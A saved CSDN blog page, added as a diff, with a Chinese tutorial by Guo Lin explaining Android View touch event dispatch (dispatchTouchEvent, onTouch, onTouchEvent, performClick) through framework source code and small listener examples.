@@ -1,0 +1,1314 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+     
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    
+<head>  
+
+    <script type="text/javascript" src="http://c.csdnimg.cn/pubfooter/js/tracking.js" charset="utf-8"></script>  
+
+    <script type="text/javascript">
+        var protocol = window.location.protocol;
+        document.write('<script type="text/javascript" src="' + protocol + '//csdnimg.cn/pubfooter/js/repoAddr2.js?v=' + Math.random() + '"></' + 'script>');
+    </script>
+
+  
+ <meta http-equiv="Cache-Control" content="no-siteapp" /><link rel="alternate" media="handheld" href="#" />
+
+    <title>Android事件分发机制完全解析，带你从源码的角度彻底理解(上) - 郭霖的专栏
+        - 博客频道 - CSDN.NET</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="description" content="其实我一直准备写一篇关于Android事件分发机制的文章，从我的第一篇博客开始，就零零散散在好多地方使用到了Android事件分发的知识。也有好多朋友问过我各种问题，比如：onTouch和onTouchEvent有什么区别，又该如何使用？为什么给ListView引入了一个滑动菜单的功能，ListView就不能滚动了？为什么图片轮播器里的图片使用Button而不用ImageView？等等……对于这些问题，我并没有给出非常详细的回答，因为我知道如果想要彻底搞明白这些问题，掌握Android事件分发机制是必不可少" />
+    <script src="http://static.blog.csdn.net/scripts/jquery.js" type="text/javascript"></script>
+      <script type="text/javascript" src="http://static.blog.csdn.net/scripts/jquery-version.js"></script>
+    <script type="text/javascript" src="http://static.blog.csdn.net/scripts/ad.js?v=1.1"></script>
+        <!--new top-->
+               <link rel="stylesheet" href="http://c.csdnimg.cn/public/common/toolbar/css/index.css">        <!--new top-->
+    
+      <!-- ad begin -->
+         <script language="javascript" type="text/javascript" src="http://ads.csdn.net/js/tracking.js"></script>
+    <!-- ad end-->
+
+    <link rel="Stylesheet" type="text/css" href="http://static.blog.csdn.net/skin/skin-white/css/style.css?v=1.1" />
+    <link id="RSSLink" title="RSS" type="application/rss+xml" rel="alternate" href="/sinyu890807/rss/list" />
+    <link rel="shortcut icon" href="http://c.csdnimg.cn/public/favicon.ico" />
+    <link type="text/css" rel="stylesheet" href="http://static.blog.csdn.net/scripts/SyntaxHighlighter/styles/default.css" />
+ 
+
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?6bcd52f51e9b3dce32bec4a3997715ac";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+</head>
+<body>
+
+
+    <!-- 广告位开始 -->
+        <ins data-revive-zoneid="149" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    <!-- 广告位结束 -->
+
+    
+   
+      <!--new top-->
+    <script id="toolbar-tpl-scriptId" fixed="true" prod="blog" skin="black" src="http://c.csdnimg.cn/public/common/toolbar/js/html.js" type="text/javascript"></script>
+     <!--new top-->
+    <div id="container">
+        <div id="header">
+    <div class="header">
+        <div id="blog_title">
+            <h2>
+                <a href="http://blog.csdn.net/guolin_blog">郭霖的专栏</a></h2>
+            <h3>每当你在感叹，如果有这样一个东西就好了的时候，请注意，其实这是你的机会</h3>
+            <div class="clear">
+            </div>
+        </div>
+        <div class="clear">
+        </div>
+        
+     
+    </div>
+</div>
+<div id="navigator">
+    <div class="navigator_bg">
+    </div>
+    <div class="navigator">
+        <ul>           
+                <li id="btnContents"><a href="http://blog.csdn.net/guolin_blog?viewmode=contents"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_mulu'])">
+                    <img src="http://static.blog.csdn.net/images/ico_list.gif">目录视图</span></a></li>
+                <li id="btnView"><a href="http://blog.csdn.net/guolin_blog?viewmode=list"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_zhaiyao'])">
+                    <img src="http://static.blog.csdn.net/images/ico_summary.gif">摘要视图</span></a></li>
+                <li id="btnRss"><a href="http://blog.csdn.net/guolin_blog/rss/list"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_RSS'])">
+                    <img src="http://static.blog.csdn.net/images/ico_rss.gif">订阅</span></a></li>                
+            
+
+            </ul>
+    </div>
+</div>
+<script type="text/javascript">
+    var username = "sinyu890807";
+    var _blogger = username;
+    var blog_address = "http://blog.csdn.net/guolin_blog";
+    var static_host = "http://static.blog.csdn.net";
+    var currentUserName = "";  
+</script>
+
+        <div id="body">
+            <div id="main">
+                <div class="main">
+                        <div class="ad_class">
+<div class="notice tracking-ad" data-mod='popu_3' > 
+
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/60960431">
+<font color=red> CSDN日报20170309——《程序员，杂草和大树，你选哪个》</font></a>
+
+&nbsp;&nbsp;&nbsp;&nbsp
+
+<a href="http://blog.csdn.net/turingbooks/article/details/58072986">
+<font color=blue>程序员2月书讯
+</font></a>
+
+&nbsp;&nbsp;&nbsp;
+
+<a href="http://edu.csdn.net/huiyiCourse/detail/284?ref=blog&loc=r3">
+<font color=red>【直播】用面向协议的思想简化网络请求
+</font></a>
+&nbsp;&nbsp;&nbsp;
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/60961185">
+<font color=blue>博客一键搬家活动开始啦
+</font></a>
+
+</div>                        </div>
+                        
+
+
+
+  
+<link href="http://static.blog.csdn.net/css/comment1.css" type="text/css" rel="stylesheet" />
+<link href="http://static.blog.csdn.net/css/style1.css" type="text/css" rel="stylesheet" />
+<script language='JavaScript' type='text/javascript' src='http://download.csdn.net/js/jquery.cookie.js'></script>
+<script type="text/javascript" src="http://c.csdnimg.cn/rabbit/search-service/main.js"></script>
+<link rel="stylesheet" href="http://static.blog.csdn.net/public/res-min/markdown_views.css?v=1.0" />
+<link rel="stylesheet" href="http://static.blog.csdn.net/css/category.css?v=1.0" />
+<script type="text/javascript" src="http://static.blog.csdn.net/public/res/bower-libs/MathJax/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/web-storage-cache.min.js"></script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/replace.min.js"></script>
+
+
+
+
+  <script type="text/ecmascript">
+      window.quickReplyflag = true;
+           
+            var isBole = false;
+            
+      
+      var fasrc="http://my.csdn.net/my/favorite/miniadd?t=Android%e4%ba%8b%e4%bb%b6%e5%88%86%e5%8f%91%e6%9c%ba%e5%88%b6%e5%ae%8c%e5%85%a8%e8%a7%a3%e6%9e%90%ef%bc%8c%e5%b8%a6%e4%bd%a0%e4%bb%8e%e6%ba%90%e7%a0%81%e7%9a%84%e8%a7%92%e5%ba%a6%e5%bd%bb%e5%ba%95%e7%90%86%e8%a7%a3(%e4%b8%8a)&u=http://blog.csdn.net/guolin_blog/article/details/9097463/"
+
+    </script>
+<div id="article_details" class="details">
+    <div class="article_title">   
+         <span class="ico ico_type_Original"></span>
+
+
+    <h1>
+        <span class="link_title"><a href="/guolin_blog/article/details/9097463">
+        Android事件分发机制完全解析，带你从源码的角度彻底理解(上)            
+        </a></span>
+    </h1>
+</div>
+
+   
+
+        <div class="article_manage clearfix">
+        <div class="article_l">
+            <span class="link_categories">
+            标签：
+              <a href='http://www.csdn.net/tag/Android' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">Android</a><a href='http://www.csdn.net/tag/%e4%ba%8b%e4%bb%b6%e5%88%86%e5%8f%91' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">事件分发</a><a href='http://www.csdn.net/tag/onTouch' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">onTouch</a><a href='http://www.csdn.net/tag/dispatchTouchEvent' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">dispatchTouchEvent</a><a href='http://www.csdn.net/tag/onTouchEvent' target=_blank onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_tag']);">onTouchEvent</a>
+            </span>
+        </div>
+        <div class="article_r">
+            <span class="link_postdate">2013-06-20 08:30</span>
+            <span class="link_view" title="阅读次数">238243人阅读</span>
+            <span class="link_comments" title="评论次数"> <a href="#comments" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_pinglun'])">评论</a>(277)</span>
+            <span class="link_collect tracking-ad" data-mod="popu_171"> <a href="javascript:void(0);" onclick="javascript:collectArticle('Android%e4%ba%8b%e4%bb%b6%e5%88%86%e5%8f%91%e6%9c%ba%e5%88%b6%e5%ae%8c%e5%85%a8%e8%a7%a3%e6%9e%90%ef%bc%8c%e5%b8%a6%e4%bd%a0%e4%bb%8e%e6%ba%90%e7%a0%81%e7%9a%84%e8%a7%92%e5%ba%a6%e5%bd%bb%e5%ba%95%e7%90%86%e8%a7%a3(%e4%b8%8a)','9097463');return false;" title="收藏">收藏</a></span>
+             <span class="link_report"> <a href="#report" onclick="javascript:report(9097463,2);return false;" title="举报">举报</a></span>
+
+        </div>
+    </div>
+    <div class="embody"  style="display:none" id="embody">
+        <span class="embody_t">本文章已收录于：</span>
+        <div class="embody_c" id="lib" value="{&quot;err&quot;:0,&quot;msg&quot;:&quot;ok&quot;,&quot;data&quot;:[]}"></div>
+    </div>
+    <style type="text/css">        
+            .embody{
+                padding:10px 10px 10px;
+                margin:0 -20px;
+                border-bottom:solid 1px #ededed;                
+            }
+            .embody_b{
+                margin:0 ;
+                padding:10px 0;
+            }
+            .embody .embody_t,.embody .embody_c{
+                display: inline-block;
+                margin-right:10px;
+            }
+            .embody_t{
+                font-size: 12px;
+                color:#999;
+            }
+            .embody_c{
+                font-size: 12px;
+            }
+            .embody_c img,.embody_c em{
+                display: inline-block;
+                vertical-align: middle;               
+            }
+             .embody_c img{               
+                width:30px;
+                height:30px;
+            }
+            .embody_c em{
+                margin: 0 20px 0 10px;
+                color:#333;
+                font-style: normal;
+            }
+    </style>
+    <script  type="text/javascript">
+        $(function () {
+            try
+            {
+                var lib = eval("("+$("#lib").attr("value")+")");
+                var html = "";
+                if (lib.err == 0) {
+                    $.each(lib.data, function (i) {
+                        var obj = lib.data[i];
+                        //html += '<img src="' + obj.logo + '"/>' + obj.name + "&nbsp;&nbsp;";
+                        html += ' <a href="' + obj.url + '" target="_blank">';
+                        html += ' <img src="' + obj.logo + '">';
+                        html += ' <em><b>' + obj.name + '</b></em>';
+                        html += ' </a>';
+                    });
+                    if (html != "") {
+                        setTimeout(function () {
+                            $("#lib").html(html);                      
+                            $("#embody").show();
+                        }, 100);
+                    }
+                }      
+            } catch (err)
+            { }
+            
+        });
+    </script>
+      <div class="category clearfix">
+        <div class="category_l">
+           <img src="http://static.blog.csdn.net/images/category_icon.jpg">
+            <span>分类：</span>
+        </div>
+        <div class="category_r">
+                    <label  onclick="GetCategoryArticles('1399638','sinyu890807','top','9097463');">
+                        <span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_fenlei']);">Android疑难解析<em>（35）</em></span>
+                      <img class="arrow-down" src="http://static.blog.csdn.net/images/arrow_triangle _down.jpg" style="display:inline;">
+                      <img class="arrow-up" src="http://static.blog.csdn.net/images/arrow_triangle_up.jpg" style="display:none;">
+                        <div class="subItem">
+                            <div class="subItem_t"><a  href="http://blog.csdn.net/sinyu890807/article/category/1399638"  target="_blank">作者同类文章</a><i class="J_close">X</i></div>
+                            <ul class="subItem_l" id="top_1399638">                            
+                            </ul>
+                        </div>
+                    </label>                    
+        </div>
+    </div>
+    <script   type="text/javascript" src="http://static.blog.csdn.net/scripts/category.js"></script>  
+        <div   class="bog_copyright">         
+            <p  class="copyright_p" >版权声明：本文出自郭霖的博客，转载必须注明出处。</p>
+        </div>
+
+  
+
+  
+  
+     
+
+<div id="article_content" class="article_content">
+<p>转载请注明出处：<a target=_blank target="_blank" href="http://blog.csdn.net/sinyu890807/article/details/8986285"></a><a target=_blank target="_blank" href="http://blog.csdn.net/sinyu890807/article/details/9097463"></a><a target=_blank target="_blank" href="http://blog.csdn.net/guolin_blog/article/details/9097463">http://blog.csdn.net/guolin_blog/article/details/9097463</a><br /></p><p><br /></p><p>其实我一直准备写一篇关于Android事件分发机制的文章，从我的第一篇博客开始，就零零散散在好多地方使用到了Android事件分发的知识。也有好多朋友问过我各种问题，比如：onTouch和onTouchEvent有什么区别，又该如何使用？为什么给ListView引入了一个滑动菜单的功能，ListView就不能滚动了？为什么图片轮播器里的图片使用Button而不用ImageView？等等……对于这些问题，我并没有给出非常详细的回答，因为我知道如果想要彻底搞明白这些问题，掌握Android事件分发机制是必不可少的，而Android事件分发机制绝对不是三言两语就能说得清的。</p><p><br /></p><p>在我经过较长时间的筹备之后，终于决定开始写这样一篇文章了。目前虽然网上相关的文章也不少，但我觉得没有哪篇写得特别详细的(也许我还没有找到)，多数文章只是讲了讲理论，然后配合demo运行了一下结果。而我准备带着大家从源码的角度进行分析，相信大家可以更加深刻地理解Android事件分发机制。<br /></p><p><br /></p><p>阅读源码讲究由浅入深，循序渐进，因此我们也从简单的开始，本篇先带大家探究View的事件分发，下篇再去探究难度更高的ViewGroup的事件分发。<br /></p><p><br /></p><p>那我们现在就开始吧！比如说你当前有一个非常简单的项目，只有一个Activity，并且Activity中只有一个按钮。你可能已经知道，如果想要给这个按钮注册一个点击事件，只需要调用：</p><pre name="code" class="java">button.setOnClickListener(new OnClickListener() {
+	@Override
+	public void onClick(View v) {
+		Log.d(&quot;TAG&quot;, &quot;onClick execute&quot;);
+	}
+});</pre>这样在onClick方法里面写实现，就可以在按钮被点击的时候执行。你可能也已经知道，如果想给这个按钮再添加一个touch事件，只需要调用：<pre name="code" class="java">button.setOnTouchListener(new OnTouchListener() {
+	@Override
+	public boolean onTouch(View v, MotionEvent event) {
+		Log.d(&quot;TAG&quot;, &quot;onTouch execute, action &quot; + event.getAction());
+		return false;
+	}
+});</pre><p>onTouch方法里能做的事情比onClick要多一些，比如判断手指按下、抬起、移动等事件。那么如果我两个事件都注册了，哪一个会先执行呢？我们来试一下就知道了，运行程序点击按钮，打印结果如下：</p><p><br /></p><p style="text-align: center;"><img src="http://img.blog.csdn.net/20130614230234671" alt="" /><br /></p><p style="text-align: center;"><br /></p><p>可以看到，onTouch是优先于onClick执行的，并且onTouch执行了两次，一次是ACTION_DOWN，一次是ACTION_UP(你还可能会有多次ACTION_MOVE的执行，如果你手抖了一下)。因此事件传递的顺序是先经过onTouch，再传递到onClick。</p><p><br /></p><p>细心的朋友应该可以注意到，onTouch方法是有返回值的，这里我们返回的是false，如果我们尝试把onTouch方法里的返回值改成true，再运行一次，结果如下：</p><p><br /></p><p style="text-align: center;"><img src="http://img.blog.csdn.net/20130614231001468" alt="" /><br /></p><p style="text-align: center;"><br /></p><p>我们发现，onClick方法不再执行了！为什么会这样呢？你可以先理解成onTouch方法返回true就认为这个事件被onTouch消费掉了，因而不会再继续向下传递。</p><p><br /></p><p>如果到现在为止，以上的所有知识点你都是清楚的，那么说明你对Android事件传递的基本用法应该是掌握了。不过别满足于现状，让我们从源码的角度分析一下，出现上述现象的原理是什么。</p><p><br /></p><p>首先你需要知道一点，只要你触摸到了任何一个控件，就一定会调用该控件的dispatchTouchEvent方法。那当我们去点击按钮的时候，就会去调用Button类里的dispatchTouchEvent方法，可是你会发现Button类里并没有这个方法，那么就到它的父类TextView里去找一找，你会发现TextView里也没有这个方法，那没办法了，只好继续在TextView的父类View里找一找，这个时候你终于在View里找到了这个方法，示意图如下：</p><p><br /></p><p style="text-align: center;"><img src="http://img.blog.csdn.net/20130616154134500" alt="" /><br /></p><p style="text-align: center;"><br /></p><p>然后我们来看一下View中dispatchTouchEvent方法的源码：</p><pre name="code" class="java">public boolean dispatchTouchEvent(MotionEvent event) {
+    if (mOnTouchListener != null &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp;
+            mOnTouchListener.onTouch(this, event)) {
+        return true;
+    }
+    return onTouchEvent(event);
+}</pre><p>这个方法非常的简洁，只有短短几行代码！我们可以看到，在这个方法内，首先是进行了一个判断，如果mOnTouchListener != null，(mViewFlags &amp; ENABLED_MASK) == ENABLED和mOnTouchListener.onTouch(this, event)这三个条件都为真，就返回true，否则就去执行onTouchEvent(event)方法并返回。</p><p><br /></p><p>先看一下第一个条件，mOnTouchListener这个变量是在哪里赋值的呢？我们寻找之后在View里发现了如下方法：</p><pre name="code" class="java">public void setOnTouchListener(OnTouchListener l) {
+    mOnTouchListener = l;
+}</pre><p>Bingo！找到了，mOnTouchListener正是在setOnTouchListener方法里赋值的，也就是说只要我们给控件注册了touch事件，mOnTouchListener就一定被赋值了。</p><p><br /></p><p>第二个条件(mViewFlags &amp; ENABLED_MASK) == ENABLED是判断当前点击的控件是否是enable的，按钮默认都是enable的，因此这个条件恒定为true。</p><p><br /></p><p>第三个条件就比较关键了，mOnTouchListener.onTouch(this, event)，其实也就是去回调控件注册touch事件时的onTouch方法。也就是说如果我们在onTouch方法里返回true，就会让这三个条件全部成立，从而整个方法直接返回true。如果我们在onTouch方法里返回false，就会再去执行onTouchEvent(event)方法。</p><p><br /></p><p>现在我们可以结合前面的例子来分析一下了，首先在dispatchTouchEvent中最先执行的就是onTouch方法，因此onTouch肯定是要优先于onClick执行的，也是印证了刚刚的打印结果。而如果在onTouch方法里返回了true，就会让dispatchTouchEvent方法直接返回true，不会再继续往下执行。而打印结果也证实了如果onTouch返回true，onClick就不会再执行了。</p><p><br /></p><p>根据以上源码的分析，从原理上解释了我们前面例子的运行结果。而上面的分析还透漏出了一个重要的信息，那就是onClick的调用肯定是在onTouchEvent(event)方法中的！那我们马上来看下onTouchEvent的源码，如下所示：</p><pre name="code" class="java">public boolean onTouchEvent(MotionEvent event) {
+    final int viewFlags = mViewFlags;
+    if ((viewFlags &amp; ENABLED_MASK) == DISABLED) {
+        // A disabled view that is clickable still consumes the touch
+        // events, it just doesn't respond to them.
+        return (((viewFlags &amp; CLICKABLE) == CLICKABLE ||
+                (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE));
+    }
+    if (mTouchDelegate != null) {
+        if (mTouchDelegate.onTouchEvent(event)) {
+            return true;
+        }
+    }
+    if (((viewFlags &amp; CLICKABLE) == CLICKABLE ||
+            (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)) {
+        switch (event.getAction()) {
+            case MotionEvent.ACTION_UP:
+                boolean prepressed = (mPrivateFlags &amp; PREPRESSED) != 0;
+                if ((mPrivateFlags &amp; PRESSED) != 0 || prepressed) {
+                    // take focus if we don't have it already and we should in
+                    // touch mode.
+                    boolean focusTaken = false;
+                    if (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) {
+                        focusTaken = requestFocus();
+                    }
+                    if (!mHasPerformedLongPress) {
+                        // This is a tap, so remove the longpress check
+                        removeLongPressCallback();
+                        // Only perform take click actions if we were in the pressed state
+                        if (!focusTaken) {
+                            // Use a Runnable and post this rather than calling
+                            // performClick directly. This lets other visual state
+                            // of the view update before click actions start.
+                            if (mPerformClick == null) {
+                                mPerformClick = new PerformClick();
+                            }
+                            if (!post(mPerformClick)) {
+                                performClick();
+                            }
+                        }
+                    }
+                    if (mUnsetPressedState == null) {
+                        mUnsetPressedState = new UnsetPressedState();
+                    }
+                    if (prepressed) {
+                        mPrivateFlags |= PRESSED;
+                        refreshDrawableState();
+                        postDelayed(mUnsetPressedState,
+                                ViewConfiguration.getPressedStateDuration());
+                    } else if (!post(mUnsetPressedState)) {
+                        // If the post failed, unpress right now
+                        mUnsetPressedState.run();
+                    }
+                    removeTapCallback();
+                }
+                break;
+            case MotionEvent.ACTION_DOWN:
+                if (mPendingCheckForTap == null) {
+                    mPendingCheckForTap = new CheckForTap();
+                }
+                mPrivateFlags |= PREPRESSED;
+                mHasPerformedLongPress = false;
+                postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout());
+                break;
+            case MotionEvent.ACTION_CANCEL:
+                mPrivateFlags &amp;= ~PRESSED;
+                refreshDrawableState();
+                removeTapCallback();
+                break;
+            case MotionEvent.ACTION_MOVE:
+                final int x = (int) event.getX();
+                final int y = (int) event.getY();
+                // Be lenient about moving outside of buttons
+                int slop = mTouchSlop;
+                if ((x &lt; 0 - slop) || (x &gt;= getWidth() + slop) ||
+                        (y &lt; 0 - slop) || (y &gt;= getHeight() + slop)) {
+                    // Outside button
+                    removeTapCallback();
+                    if ((mPrivateFlags &amp; PRESSED) != 0) {
+                        // Remove any future long press/tap checks
+                        removeLongPressCallback();
+                        // Need to switch from pressed to not pressed
+                        mPrivateFlags &amp;= ~PRESSED;
+                        refreshDrawableState();
+                    }
+                }
+                break;
+        }
+        return true;
+    }
+    return false;
+}
+</pre><p>相较于刚才的dispatchTouchEvent方法，onTouchEvent方法复杂了很多，不过没关系，我们只挑重点看就可以了。</p><p><br /></p><p>首先在第14行我们可以看出，如果该控件是可以点击的就会进入到第16行的switch判断中去，而如果当前的事件是抬起手指，则会进入到MotionEvent.ACTION_UP这个case当中。在经过种种判断之后，会执行到第38行<span style="font-family: Consolas, &quot;Courier New&quot;, Courier, mono, serif;"><span style="line-height:18px">的performClick()方法，那我们进入到这个方法里瞧一瞧：</span></span></p><pre name="code" class="java">public boolean performClick() {
+    sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED);
+    if (mOnClickListener != null) {
+        playSoundEffect(SoundEffectConstants.CLICK);
+        mOnClickListener.onClick(this);
+        return true;
+    }
+    return false;
+}</pre>可以看到，只要mOnClickListener不是null，就会去调用它的onClick方法，那mOnClickListener又是在哪里赋值的呢？经过寻找后找到如下方法：<pre name="code" class="java">public void setOnClickListener(OnClickListener l) {
+    if (!isClickable()) {
+        setClickable(true);
+    }
+    mOnClickListener = l;
+}</pre><p>一切都是那么清楚了！当我们通过调用setOnClickListener方法来给控件注册一个点击事件时，就会给mOnClickListener赋值。然后每当控件被点击时，都会在performClick()方法里回调被点击控件的onClick方法。</p><p><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></p><p>这样View的整个事件分发的流程就让我们搞清楚了！不过别高兴的太早，现在还没结束，还有一个很重要的知识点需要说明，就是touch事件的层级传递。我们都知道如果给一个控件注册了touch事件，每次点击它的时候都会触发一系列的ACTION_DOWN，ACTION_MOVE，ACTION_UP等事件。这里需要注意，如果你在执行ACTION_DOWN的时候返回了false，后面一系列其它的action就不会再得到执行了。简单的说，就是当dispatchTouchEvent在进行事件分发的时候，只有前一个action返回true，才会触发后一个action。</p><p><span style="font-family: Consolas, &quot;Courier New&quot;, Courier, mono, serif; line-height: 18px;"><br /></span></p><p>说到这里，很多的朋友肯定要有巨大的疑问了。这不是在自相矛盾吗？前面的例子中，明明在onTouch事件里面返回了false，ACTION_DOWN和ACTION_UP不是都得到执行了吗？其实你只是被假象所迷惑了，让我们仔细分析一下，在前面的例子当中，我们到底返回的是什么。</p><p>参考着我们前面分析的源码，首先在onTouch事件里返回了false，就一定会进入到onTouchEvent方法中，然后我们来看一下onTouchEvent方法的细节。由于我们点击了按钮，就会进入到第14行这个if判断的内部，然后你会发现，不管当前的action是什么，最终都一定会走到第89行，返回一个true。</p><p><br /></p><p>是不是有一种被欺骗的感觉？明明在onTouch事件里返回了false，系统还是在onTouchEvent方法中帮你返回了true。就因为这个原因，才使得前面的例子中ACTION_UP可以得到执行。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></p><p>那我们可以换一个控件，将按钮替换成ImageView，然后给它也注册一个touch事件，并返回false。如下所示：</p><pre name="code" class="java">imageView.setOnTouchListener(new OnTouchListener() {
+	@Override
+	public boolean onTouch(View v, MotionEvent event) {
+		Log.d(&quot;TAG&quot;, &quot;onTouch execute, action &quot; + event.getAction());
+		return false;
+	}
+});</pre><p>运行一下程序，点击ImageView，你会发现结果如下：</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></p><p style="text-align: center;"><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><img src="http://img.blog.csdn.net/20130617193504328" alt="" /><br /></span></span></span></p><p style="text-align: center;"><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></p><p>在ACTION_DOWN执行完后，后面的一系列action都不会得到执行了。这又是为什么呢？因为ImageView和按钮不同，它是默认不可点击的，因此在onTouchEvent的第14行判断时无法进入到if的内部，直接跳到第91行返回了false，也就导致后面其它的action都无法执行了。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></p><p>好了，关于View的事件分发，我想讲的东西全都在这里了。现在我们再来回顾一下开篇时提到的那三个问题，相信每个人都会有更深一层的理解。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></p><p><strong>1.&nbsp;onTouch和onTouchEvent有什么区别，又该如何使用？</strong></p><p>从源码中可以看出，这两个方法都是在View的dispatchTouchEvent中调用的，onTouch优先于onTouchEvent执行。如果在onTouch方法中通过返回true将事件消费掉，onTouchEvent将不会再执行。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></span></span></p><p>另外需要注意的是，onTouch能够得到执行需要两个前提条件，第一mOnTouchListener的值不能为空，第二当前点击的控件必须是enable的。因此如果你有一个控件是非enable的，那么给它注册onTouch事件将永远得不到执行。对于这一类控件，如果我们想要监听它的touch事件，就必须通过在该控件中重写onTouchEvent方法来实现。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></span></span></span></p><p><strong>2.&nbsp;为什么给ListView引入了一个滑动菜单的功能，ListView就不能滚动了？</strong></p><p>如果你阅读了<a target=_blank href="http://blog.csdn.net/sinyu890807/article/details/8744400">Android实现图片滚动控件，含页签功能，让你的应用像淘宝一样炫起来</a>&nbsp;这篇文章。当时我在图片轮播器里使用Button，主要就是因为Button是可点击的，而ImageView是不可点击的。如果想要使用ImageView，可以有两种改法。第一，在ImageView的onTouch方法里返回true，这样可以保证ACTION_DOWN之后的其它action都能得到执行，才能实现图片滚动的效果。第二，在布局文件里面给ImageView增加一个android:clickable=&quot;true&quot;的属性，这样ImageView变成可点击的之后，即使在onTouch里返回了false，ACTION_DOWN之后的其它action也是可以得到执行的。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><span style="font-family:Consolas,'Courier New',Courier,mono,serif; line-height:18px"><br /></span></span></span></p><p>今天的讲解就到这里了，相信大家现在对Android事件分发机制又有了进一步的认识，在后面的文章中我会再带大家一起探究Android中ViewGroup的事件分发机制，感兴趣的朋友请继续阅读&nbsp;<a target=_blank href="http://blog.csdn.net/sinyu890807/article/details/9153747">Android事件分发机制完全解析，带你从源码的角度彻底理解(下)</a>&nbsp;。</p><p><span style="font-family:Consolas,Courier New,Courier,mono,serif"><span style="line-height:18px"><br /></span></span></p><style>blockquote{
+    border-left: 10px solid rgba(128,128,128,0.075);
+    background-color: rgba(128,128,128,0.05);
+    border-radius: 0 5px 5px 0;
+    padding: 15px 20px;
+}</style><blockquote><p>关注我的技术公众号，每天都有优质技术文章推送。关注我的娱乐公众号，工作、学习累了的时候放松一下自己。</p>    <p>微信扫一扫下方二维码即可关注：</p>    <p><img src="http://img.blog.csdn.net/20160507110203928" width="200px" alt="" /> &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;<img src="http://img.blog.csdn.net/20161011100137978" width="200px" alt="" /></p></blockquote>   
+</div>
+
+
+
+
+<!-- Baidu Button BEGIN -->
+
+
+
+
+<div class="bdsharebuttonbox tracking-ad" style="float: right;" data-mod="popu_172">
+<a href="#" class="bds_more" data-cmd="more" style="background-position:0 0 !important; background-image: url(http://bdimg.share.baidu.com/static/api/img/share/icons_0_16.png?v=d754dcc0.png) !important"></a>
+<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"  style="background-position:0 -52px !important"></a>
+<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"style="background-position:0 -104px !important"></a>
+<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"style="background-position:0 -260px !important"></a>
+<a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"style="background-position:0 -208px !important"></a>
+<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"style="background-position:0 -1612px !important" ></a>
+</div>
